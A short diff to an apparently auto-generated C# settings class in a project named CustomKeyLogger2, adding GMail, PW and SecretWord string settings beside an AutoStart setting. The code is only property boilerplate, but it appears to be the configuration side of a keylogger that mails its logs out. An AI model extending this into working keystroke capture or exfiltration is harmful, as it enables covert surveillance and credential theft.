@@ -34,5 +34,41 @@ namespace CustomKeyLogger2.Properties {
                 this["AutoStart"] = value;
             }
         }
+        
+        [global::System.Configuration.UserScopedSettingAttribute()]
+        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
+        [global::System.Configuration.DefaultSettingValueAttribute("")]
+        public string GMail {
+            get {
+                return ((string)(this["GMail"]));
+            }
+            set {
+                this["GMail"] = value;
+            }
+        }
+        
+        [global::System.Configuration.UserScopedSettingAttribute()]
+        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
+        [global::System.Configuration.DefaultSettingValueAttribute("")]
+        public string PW {
+            get {
+                return ((string)(this["PW"]));
+            }
+            set {
+                this["PW"] = value;
+            }
+        }
+        
+        [global::System.Configuration.UserScopedSettingAttribute()]
+        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
+        [global::System.Configuration.DefaultSettingValueAttribute("")]
+        public string SecretWord {
+            get {
+                return ((string)(this["SecretWord"]));
+            }
+            set {
+                this["SecretWord"] = value;
+            }
+        }
     }
 }
